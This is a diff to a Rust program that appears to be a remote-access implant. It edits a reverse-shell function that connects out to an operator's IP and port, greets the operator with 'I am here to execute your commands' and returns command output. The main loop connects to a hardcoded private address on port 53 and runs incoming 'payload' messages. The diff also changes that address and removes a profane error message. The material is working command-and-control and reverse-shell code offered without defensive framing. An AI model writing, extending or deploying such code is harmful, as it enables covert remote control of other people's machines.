@@ -68,10 +68,11 @@ pub fn interpret_payload(payload: String) {
     }
 }
 
-pub async fn shell(ip: &str, port: &str) -> Result<()> {
+pub fn shell(ip: &str, port: &str) -> Result<()> {
     let args: Vec<String> = env::args().collect();
     
     let mut stream = OtherTcpStream::connect(format!("{}:{}", ip, port))?;
+    
     stream.write(b"Welcome to rustshell.\nI am here to execute your commands\nuse 'exit' to exit\n")?;
     let mut buffer = [0; 2048];
 
@@ -92,7 +93,7 @@ pub async fn shell(ip: &str, port: &str) -> Result<()> {
         let reply = output.stdout;
         stream.write(&reply).unwrap();
     };
-        Ok(())
+    Ok(())
 }
 
 fn vnc() {
@@ -155,7 +156,7 @@ async fn main() -> io::Result<()> {
     let username = env::var(key).unwrap();
 
     // TCP Stream creation
-    let mut _stream = TcpStream::connect("192.168.56.1:53").await?;
+    let mut _stream = TcpStream::connect("192.168.43.141:53").await?;
     let (mut reader, mut writer) = _stream.into_split();
 
     // Send public key
@@ -219,9 +220,8 @@ async fn main() -> io::Result<()> {
                 if from_json_message.message_type == "payload" {
                     interpret_payload(from_json_message.message_content);
                 }
-                println!("{}", from_json_message.message_content);
             }
-            Err(e) => {println!("Fuck you ! {}", e);}
+            Err(e) => {println!("{}", e);}
         }
     }
 }
